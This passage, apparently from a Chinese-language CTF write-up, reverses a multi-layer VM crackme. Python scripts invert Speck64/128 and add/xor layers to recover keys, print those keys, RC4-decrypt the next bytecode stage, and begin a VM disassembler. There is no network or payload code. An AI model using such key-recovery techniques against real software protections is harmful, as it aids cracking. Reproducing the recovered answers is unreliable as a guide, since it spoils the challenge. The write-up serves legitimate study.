class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Model the outermost VM layer and recover the first 64-bit key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The layer performs a couple of invertible 64-bit add/xor scramblings on the</span></span><br><span class="line"><span class="string">user-controlled key and then runs a 27-round Speck64/128 encryption on the</span></span><br><span class="line"><span class="string">result with a fixed 128-bit key.  The Speck output must equal the constant</span></span><br><span class="line"><span class="string">`0xDA19BA6B81C83F61`, so we can invert the whole chain and recover the key.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line">MASK32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line">MASK64 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">ROUNDS = <span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Layer 1 constants pulled from bytecode around 0x05b0.</span></span><br><span class="line">L1_CONST_SUB = (<span class="number">0x48F0_E642_1AC6_6DEA</span>, <span class="number">0x5566_488C_9C5C_F234</span>)</span><br><span class="line">L1_CONST_XOR = (<span class="number">0x5074_D85B_9194_E696</span>, <span class="number">0x8CB3_3116_3A92_FC19</span>)</span><br><span class="line"></span><br><span class="line">L1_SPECK_KEY = [</span><br><span class="line">    <span class="number">0xE433_713D</span>,</span><br><span class="line">    <span class="number">0x36B1_CC9F</span>,</span><br><span class="line">    <span class="number">0x9C84_EBD8</span>,</span><br><span class="line">    <span class="number">0xF976_46D6</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">L1_TARGET_CT = <span class="number">0xDA19_BA6B_81C8_3F61</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Layer 2 constants read from stage2.bin.</span></span><br><span class="line">L2_CONST_XOR_PREFIX = (</span><br><span class="line">    <span class="number">0x9571_4C91_BC8B_306F</span>,</span><br><span class="line">    <span class="number">0x4303_F922_41DD_9A9F</span>,</span><br><span class="line">    <span class="number">0x311E_18C9_1413_B58C</span>,</span><br><span class="line">)</span><br><span class="line">L2_CONST_SUB = (</span><br><span class="line">    <span class="number">0x8DF6_073D_0DBB_FF09</span>,</span><br><span class="line">    <span class="number">0xEE57_44EF_E81E_97B7</span>,</span><br><span class="line">)</span><br><span class="line">L2_CONST_ADD = (</span><br><span class="line">    <span class="number">0xF8A8_2A8D_BDB7_8C3F</span>,</span><br><span class="line">    <span class="number">0x58E8_ABFC_7618_F5FD</span>,</span><br><span class="line">)</span><br><span class="line">L2_CONST_XOR_SUFFIX = <span class="number">0x99D8_8C4F_A4CC_68AA</span></span><br><span class="line"></span><br><span class="line">L2_SPECK_KEY = [</span><br><span class="line">    <span class="number">0x6DF9_F721</span>,</span><br><span class="line">    <span class="number">0x8D85_B315</span>,</span><br><span class="line">    <span class="number">0x40BC_0884</span>,</span><br><span class="line">    <span class="number">0x28E3_D333</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">L2_TARGET_CT = <span class="number">0x6593_91A5_DC35_22B3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_rol32</span>(<span class="params">x: <span class="built_in">int</span>, r: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; r) | (x &gt;&gt; (<span class="number">32</span> - r))) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_ror32</span>(<span class="params">x: <span class="built_in">int</span>, r: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; r) | ((x &lt;&lt; (<span class="number">32</span> - r)) &amp; MASK32)) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">speck_round_keys</span>(<span class="params">key_words: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate 27 round keys for Speck64/128 (matches the VM&#x27;s key schedule).&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    l = <span class="built_in">list</span>(key_words[<span class="number">1</span>:])</span><br><span class="line">    k = key_words[<span class="number">0</span>]</span><br><span class="line">    keys: <span class="built_in">list</span>[<span class="built_in">int</span>] = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">        keys.append(k)</span><br><span class="line">        idx = i % (<span class="built_in">len</span>(key_words) - <span class="number">1</span>)</span><br><span class="line">        val = (_ror32(l[idx], <span class="number">8</span>) + k) &amp; MASK32</span><br><span class="line">        val ^= i</span><br><span class="line">        l[idx] = val</span><br><span class="line">        k = (_rol32(k, <span class="number">3</span>) ^ val) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">speck_encrypt_block</span>(<span class="params">block: <span class="built_in">int</span>, round_keys: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    x = block &amp; MASK32</span><br><span class="line">    y = (block &gt;&gt; <span class="number">32</span>) &amp; MASK32</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> round_keys:</span><br><span class="line">        x = (_ror32(x, <span class="number">8</span>) + y) &amp; MASK32</span><br><span class="line">        x ^= k</span><br><span class="line">        y = _rol32(y, <span class="number">3</span>) ^ x</span><br><span class="line">    <span class="keyword">return</span> (y &lt;&lt; <span class="number">32</span>) | x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">speck_decrypt_block</span>(<span class="params">block: <span class="built_in">int</span>, round_keys: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    x = block &amp; MASK32</span><br><span class="line">    y = (block &gt;&gt; <span class="number">32</span>) &amp; MASK32</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">reversed</span>(round_keys):</span><br><span class="line">        y = _ror32(y ^ x, <span class="number">3</span>)</span><br><span class="line">        x ^= k</span><br><span class="line">        x = _rol32((x - y) &amp; MASK32, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> (y &lt;&lt; <span class="number">32</span>) | x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">L1_ROUND_KEYS = speck_round_keys(L1_SPECK_KEY)</span><br><span class="line">L2_ROUND_KEYS = speck_round_keys(L2_SPECK_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">layer1_forward</span>(<span class="params">user_key: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Exact logic executed by the first layer before the comparison.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    state = (user_key - L1_CONST_SUB[<span class="number">0</span>]) &amp; MASK64</span><br><span class="line">    state ^= L1_CONST_XOR[<span class="number">0</span>]</span><br><span class="line">    state = (state - L1_CONST_SUB[<span class="number">1</span>]) &amp; MASK64</span><br><span class="line">    state ^= L1_CONST_XOR[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> speck_encrypt_block(state, L1_ROUND_KEYS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_layer1</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Invert the layer to retrieve the 64-bit key expected by the VM.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    state = speck_decrypt_block(L1_TARGET_CT, L1_ROUND_KEYS)</span><br><span class="line">    state ^= L1_CONST_XOR[<span class="number">1</span>]</span><br><span class="line">    state = (state + L1_CONST_SUB[<span class="number">1</span>]) &amp; MASK64</span><br><span class="line">    state ^= L1_CONST_XOR[<span class="number">0</span>]</span><br><span class="line">    state = (state + L1_CONST_SUB[<span class="number">0</span>]) &amp; MASK64</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">layer2_forward</span>(<span class="params">user_key: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    state = user_key</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> L2_CONST_XOR_PREFIX:</span><br><span class="line">        state ^= c</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> L2_CONST_SUB:</span><br><span class="line">        state = (state - c) &amp; MASK64</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> L2_CONST_ADD:</span><br><span class="line">        state = (state + c) &amp; MASK64</span><br><span class="line">    state ^= L2_CONST_XOR_SUFFIX</span><br><span class="line">    <span class="keyword">return</span> speck_encrypt_block(state, L2_ROUND_KEYS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_layer2</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    state = speck_decrypt_block(L2_TARGET_CT, L2_ROUND_KEYS)</span><br><span class="line">    state ^= L2_CONST_XOR_SUFFIX</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">reversed</span>(L2_CONST_ADD):</span><br><span class="line">        state = (state - c) &amp; MASK64</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">reversed</span>(L2_CONST_SUB):</span><br><span class="line">        state = (state + c) &amp; MASK64</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">reversed</span>(L2_CONST_XOR_PREFIX):</span><br><span class="line">        state ^= c</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key1 = solve_layer1()</span><br><span class="line">    <span class="keyword">assert</span> layer1_forward(key1) == L1_TARGET_CT</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;layer1 key = 0x<span class="subst">&#123;key1:016x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    key2 = solve_layer2()</span><br><span class="line">    <span class="keyword">assert</span> layer2_forward(key2) == L2_TARGET_CT</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;layer2 key = 0x<span class="subst">&#123;key2:016x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>layer1 key &#x3D; 0xa28f38bd0463522c</p><p>layer2 key &#x3D; 0xbf11b34d0ce941cc</p><p>所以后续步骤是：</p><ol><li>用 Speck 逆向还原第二层常量，算出 key[1]（方法跟第一层脚本一样，换常量即可）。</li><li>拿这个 key 做 RC4，解 full_vmcode[0x0921 : 0x0921+0x5E60] 得到第三层，再继续同样的分析。</li></ol><p>就是剥洋葱…逻辑差不多，要写个自动脚本</p><p>需要</p><p>解开key-&gt;获得下一段长度和偏移-&gt;rc4解密-&gt;识别更改的地方-&gt;解密得到key</p><p>这里解密测试碰上了个问题</p><p>也就是Rc4解密的时候也是嵌套的</p><blockquote><p>也就是说第50层要经过50次解密，所以之前的rc4解密代码得换种写法</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x072a</span></span><br><span class="line">length = <span class="number">0x6057</span></span><br><span class="line">full = Path(<span class="string">&quot;full_vmcode&quot;</span>).read_bytes()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Full file length: <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">len</span>(full))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取加密部分</span></span><br><span class="line">enc = full[start:start+length]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted data length: <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">len</span>(enc))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4解密</span></span><br><span class="line">key = (<span class="number">0xA28F38BD0463522C</span>).to_bytes(<span class="number">8</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line">S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)); j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line">out = <span class="built_in">bytearray</span>(length)</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    j = (j + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    k = S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">    out[idx] = enc[idx] ^ k</span><br><span class="line"></span><br><span class="line">new_full = <span class="built_in">bytearray</span>(full)</span><br><span class="line">new_full[start:start+length] = out</span><br><span class="line">Path(<span class="string">&quot;stage2.bin&quot;</span>).write_bytes(new_full)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x0921</span></span><br><span class="line">length = <span class="number">0x5E60</span></span><br><span class="line">full = Path(<span class="string">&quot;stage2.bin&quot;</span>).read_bytes()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Full file length: <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">len</span>(full))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取加密部分</span></span><br><span class="line">enc = full[start:start+length]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted data length: <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">len</span>(enc))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4解密</span></span><br><span class="line">key = (<span class="number">0xBF11B34D0CE941CC</span>).to_bytes(<span class="number">8</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line">S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)); j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line">out = <span class="built_in">bytearray</span>(length)</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    j = (j + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    k = S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">    out[idx] = enc[idx] ^ k</span><br><span class="line"></span><br><span class="line">new_full = <span class="built_in">bytearray</span>(full)</span><br><span class="line">new_full[start:start+length] = out</span><br><span class="line">Path(<span class="string">&quot;stage3.bin&quot;</span>).write_bytes(new_full)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>final exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">MASK64 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">MASK32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line">ROUNDS = <span class="number">27</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_rol32</span>(<span class="params">x, r</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; r) | (x &gt;&gt; (<span class="number">32</span> - r))) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_ror32</span>(<span class="params">x, r</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; r) | ((x &lt;&lt; (<span class="number">32</span> - r)) &amp; MASK32)) &amp; MASK32</span><br><span class="line"></span><br><span class="line">OPCODES = &#123;</span><br><span class="line">    <span class="number">0x00</span>: (<span class="string">&quot;nop&quot;</span>, []),</span><br><span class="line">    <span class="number">0x01</span>: (<span class="string">&quot;jmp&quot;</span>, [<span class="string">&quot;imm16&quot;</span>]),</span><br><span class="line">    <span class="number">0x02</span>: (<span class="string">&quot;jne&quot;</span>, [<span class="string">&quot;imm16&quot;</span>]),</span><br><span class="line">    <span class="number">0x03</span>: (<span class="string">&quot;je&quot;</span>, [<span class="string">&quot;imm16&quot;</span>]),</span><br><span class="line">    <span class="number">0x11</span>: (<span class="string">&quot;setp1&quot;</span>, [<span class="string">&quot;imm16&quot;</span>]),</span><br><span class="line">    <span class="number">0x12</span>: (<span class="string">&quot;setp2&quot;</span>, [<span class="string">&quot;imm16&quot;</span>]),</span><br><span class="line">    <span class="number">0x15</span>: (<span class="string">&quot;loadp1&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x16</span>: (<span class="string">&quot;mov_imm&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm64&quot;</span>]),</span><br><span class="line">    <span class="number">0x17</span>: (<span class="string">&quot;mov&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x18</span>: (<span class="string">&quot;loadp1_off&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm16&quot;</span>]),</span><br><span class="line">    <span class="number">0x19</span>: (<span class="string">&quot;storep1&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x1f</span>: (<span class="string">&quot;addp1_reg&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x25</span>: (<span class="string">&quot;and&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x26</span>: (<span class="string">&quot;xor&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x27</span>: (<span class="string">&quot;shl&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm8&quot;</span>]),</span><br><span class="line">    <span class="number">0x29</span>: (<span class="string">&quot;xor_imm&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm64&quot;</span>]),</span><br><span class="line">    <span class="number">0x2a</span>: (<span class="string">&quot;and_imm&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm64&quot;</span>]),</span><br><span class="line">    <span class="number">0x32</span>: (<span class="string">&quot;cmp_imm&quot;</span>, [<span class="string">&quot;reg&quot;</span>, <span class="string">&quot;imm64&quot;</span>]),</span><br><span class="line">    <span class="number">0x80</span>: (<span class="string">&quot;save_pc&quot;</span>, []),</span><br><span class="line">    <span class="number">0x81</span>: (<span class="string">&quot;store_call&quot;</span>, [<span class="string">&quot;imm8&quot;</span>]),</span><br><span class="line">    <span class="number">0x82</span>: (<span class="string">&quot;call&quot;</span>, [<span class="string">&quot;imm8&quot;</span>]),</span><br><span class="line">    <span class="number">0x83</span>: (<span class="string">&quot;ret&quot;</span>, []),</span><br><span class="line">    <span class="number">0x84</span>: (<span class="string">&quot;push&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x85</span>: (<span class="string">&quot;pop&quot;</span>, [<span class="string">&quot;reg&quot;</span>]),</span><br><span class="line">    <span class="number">0x90</span>: (<span class="string">&quot;print_byte&quot;</span>, [<span class="string">&quot;imm8&quot;</span>]),</span><br><span class="line">    <span class="number">0xFF</span>: (<span class="string">&quot;halt&quot;</span>, []),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">REGS = &#123;i: <span class="string">f&quot;r<span class="subst">&#123;i&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_u16</span>(<span class="params">buf, off</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(buf[off:off+<span class="number">2</span>], <span class="string">&quot;little&quot;</span>), off + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_u64</span>(<span class="params">buf, off</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(buf[off:off+<span class="number">8</span>], <span class="string">&quot;little&quot;</span>), off + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 